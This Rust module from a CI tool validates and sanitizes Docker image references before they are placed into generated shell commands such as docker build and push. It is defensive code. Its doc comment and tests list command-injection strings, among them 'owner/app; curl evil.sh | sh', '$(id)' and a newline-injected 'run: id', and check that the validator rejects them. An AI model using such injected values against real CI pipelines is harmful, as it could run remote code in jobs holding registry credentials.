//! Docker image reference handling.
//!
//! The docker rules interpolate the image name straight into shell commands
//! that end up in the generated pipeline (`docker build -t <image> .`,
//! `docker push <image>`). The name comes from `cibox.ron`, from the origin
//! remote in `.git/config`, or from the project directory name — none of
//! which is guaranteed to be a well-formed reference. A remote URL of
//! `git@host:owner/repo; curl evil.sh | sh` would otherwise be copied
//! verbatim into a `run:` step of the release job, which holds the registry
//! credentials.
//!
//! So every name is checked here before it can reach a command:
//! [`is_valid_reference`] guards names the user wrote (a malformed one is a
//! config error, reported by `parse_config`), and [`coerce_reference`] folds
//! whatever is left — the names cibox derived itself above all — into a
//! valid reference, since the user never asked for that particular string.

/// Last-resort image name when nothing usable can be derived
pub const FALLBACK_NAME: &str = "app";

/// Longest reference the registry grammar allows
const MAX_LEN: usize = 255;

/// Longest tag the registry grammar allows
const MAX_TAG_LEN: usize = 128;

/// Whether `reference` is a valid docker image reference: an optional
/// registry host, one or more lowercase path components, and an optional
/// `:tag`. Deliberately narrower than the full grammar: digests (`@sha256:`)
/// are not build targets and bracketed IPv6 hosts are not supported.
pub fn is_valid_reference(reference: &str) -> bool {
    if reference.is_empty() || reference.len() > MAX_LEN || reference.contains('@') {
        return false;
    }

    let (name, tag) = split_tag(reference);
    if let Some(tag) = tag {
        if !is_valid_tag(tag) {
            return false;
        }
    }

    // The leading component is a registry host only when something follows
    // it; `ubuntu:22.04` is an image, `localhost:5000/app` is host + image
    let path = match name.split_once('/') {
        Some((first, rest)) if is_host_like(first) => {
            if !is_valid_host(first) {
                return false;
            }
            rest
        }
        _ => name,
    };

    path.split('/').all(is_valid_path_component)
}

/// The valid reference closest to `raw`: `raw` itself when it already is
/// one, otherwise a sanitized form — lowercased, with everything a reference
/// cannot hold replaced by `-` and the leftovers trimmed. Falls back to
/// [`FALLBACK_NAME`] when nothing usable is left.
pub fn coerce_reference(raw: &str) -> String {
    if is_valid_reference(raw) {
        return raw.to_string();
    }

    let sanitized = raw
        .split('/')
        .map(sanitize_path_component)
        .filter(|component| !component.is_empty())
        .collect::<Vec<_>>()
        .join("/");

    if sanitized.is_empty() || !is_valid_reference(&sanitized) {
        return FALLBACK_NAME.to_string();
    }
    sanitized
}

/// Split a trailing `:tag` off a reference. A colon ahead of a `/` belongs to
/// a registry port, not a tag.
fn split_tag(reference: &str) -> (&str, Option<&str>) {
    match reference.rsplit_once(':') {
        Some((name, tag)) if !tag.contains('/') => (name, Some(tag)),
        _ => (reference, None),
    }
}

fn is_valid_tag(tag: &str) -> bool {
    let bytes = tag.as_bytes();
    !bytes.is_empty()
        && bytes.len() <= MAX_TAG_LEN
        && (bytes[0].is_ascii_alphanumeric() || bytes[0] == b'_')
        && bytes
            .iter()
            .all(|b| b.is_ascii_alphanumeric() || matches!(b, b'_' | b'.' | b'-'))
}

/// Whether a leading component looks like a registry host rather than the
/// first part of the image path
fn is_host_like(component: &str) -> bool {
    component == "localhost" || component.contains('.') || component.contains(':')
}

fn is_valid_host(host: &str) -> bool {
    let (host, port) = match host.rsplit_once(':') {
        Some((host, port)) => (host, Some(port)),
        None => (host, None),
    };
    if let Some(port) = port {
        if port.is_empty() || !port.bytes().all(|b| b.is_ascii_digit()) {
            return false;
        }
    }
    !host.is_empty()
        && host.split('.').all(|label| {
            !label.is_empty()
                && !label.starts_with('-')
                && !label.ends_with('-')
                && label
                    .bytes()
                    .all(|b| b.is_ascii_alphanumeric() || b == b'-')
        })
}

/// A path component is a run of lowercase alphanumerics, optionally joined by
/// `.`, `_` or `-` separators. Repeated `_` and `-` are allowed (the registry
/// grammar permits them), repeated `.` is not.
fn is_valid_path_component(component: &str) -> bool {
    let bytes = component.as_bytes();
    let alnum = |b: u8| b.is_ascii_lowercase() || b.is_ascii_digit();
    if bytes.is_empty() || !alnum(bytes[0]) || !alnum(bytes[bytes.len() - 1]) {
        return false;
    }
    let mut previous = b'a';
    for &b in bytes {
        match b {
            b if alnum(b) => {}
            b'.' if alnum(previous) => {}
            b'_' | b'-' if previous != b'.' => {}
            _ => return false,
        }
        previous = b;
    }
    true
}

/// Lowercase one path component and replace every run of characters a
/// component cannot hold with a single `-`
fn sanitize_path_component(component: &str) -> String {
    let mut sanitized = String::with_capacity(component.len());
    for ch in component.chars() {
        let ch = ch.to_ascii_lowercase();
        if ch.is_ascii_lowercase() || ch.is_ascii_digit() || matches!(ch, '.' | '_' | '-') {
            sanitized.push(ch);
        } else if sanitized.ends_with(|c: char| c.is_ascii_alphanumeric()) {
            sanitized.push('-');
        }
    }
    // Components must start and end with an alphanumeric
    sanitized
        .trim_matches(|c: char| !c.is_ascii_alphanumeric())
        .to_string()
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_plain_names_are_valid() {
        for reference in [
            "app",
            "owner/app",
            "fossable/cibox",
            "owner/app:1.2.3",
            "owner/sub/app",
            "my-app_2.0",
            "owner/some.thing",
            "ghcr.io/owner/app",
            "registry.example.com:5000/owner/app:latest",
            "localhost:5000/app",
            "ubuntu:22.04",
        ] {
            assert!(is_valid_reference(reference), "{reference}");
        }
    }

    #[test]
    fn test_shell_metacharacters_are_rejected() {
        // Anything that could break out of `docker build -t <image> .`
        for reference in [
            "owner/app; curl evil.sh | sh",
            "owner/app && whoami",
            "owner/app$(id)",
            "owner/app `id`",
            "owner/app\nrun: id",
            "owner/app .",
            "owner/'app'",
            "owner/app\"",
            "$IMAGE",
            "owner/app > /tmp/x",
        ] {
            assert!(!is_valid_reference(reference), "{reference}");
        }
    }

    #[test]
    fn test_malformed_names_are_rejected() {
        for reference in [
            "",
            "Owner/App",           // docker requires lowercase
            "owner/App",           //
            "owner//app",          // empty component
            "/app",                //
            "app/",                //
            "-app",                // must start alphanumeric
            "app-",                // must end alphanumeric
            "owner/app:",          // empty tag
            "owner/app:-bad",      // tag must start alphanumeric or _
            "owner/app@sha256:ab", // digests are not build targets
            "owner/.app",
            "owner/app..name",
            "localhost:abc/app", // non-numeric port
        ] {
            assert!(!is_valid_reference(reference), "{reference}");
        }
    }

    #[test]
    fn test_long_references_are_rejected() {
        let long = format!("owner/{}", "a".repeat(MAX_LEN));
        assert!(!is_valid_reference(&long));
        assert_eq!(coerce_reference(&long), FALLBACK_NAME);
    }

    #[test]
    fn test_coerce_keeps_names_that_are_already_valid() {
        for reference in ["app", "owner/app", "ghcr.io/owner/app:1.2.3"] {
            assert_eq!(coerce_reference(reference), reference);
        }
    }

    #[test]
    fn test_coerce_normalizes_derived_names() {
        // The common cases: an uppercase repo slug and a directory name
        assert_eq!(coerce_reference("Fossable/CiBox"), "fossable/cibox");
        assert_eq!(coerce_reference("My Project"), "my-project");
        // Runs of unusable characters collapse instead of piling up
        assert_eq!(coerce_reference("my   app"), "my-app");
        assert_eq!(coerce_reference("-=app=-"), "app");
        assert_eq!(coerce_reference("owner//app"), "owner/app");
        assert_eq!(coerce_reference("café"), "caf");
    }

    #[test]
    fn test_coerce_output_is_always_a_valid_reference() {
        for raw in [
            "owner/repo; curl evil.sh | sh",
            "owner/repo$(id)",
            "a b c",
            "",
            "///",
            "!!!",
            "..",
            "ПРИВЕТ",
            "owner/app\nrun: id",
        ] {
            let coerced = coerce_reference(raw);
            assert!(
                is_valid_reference(&coerced),
                "{raw:?} coerced to {coerced:?}"
            );
        }
    }

    #[test]
    fn test_coerce_falls_back_when_nothing_usable_remains() {
        assert_eq!(coerce_reference(""), FALLBACK_NAME);
        assert_eq!(coerce_reference("///"), FALLBACK_NAME);
        assert_eq!(coerce_reference("!@#"), FALLBACK_NAME);
    }
}
